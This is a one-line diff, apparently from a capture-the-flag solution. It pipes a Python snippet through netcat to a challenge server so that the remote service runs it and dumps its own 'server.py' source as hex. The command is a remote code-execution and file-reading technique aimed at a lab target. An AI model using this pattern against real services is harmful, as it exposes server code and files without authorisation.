@@ -1,0 +1,5 @@
+echo "import binascii
+filename = '/home/challenge/server.py'
+with open(filename, 'rb') as f:
+    content = f.read()
+print(binascii.hexlify(content))" | nc challenge.ctf.games 31656
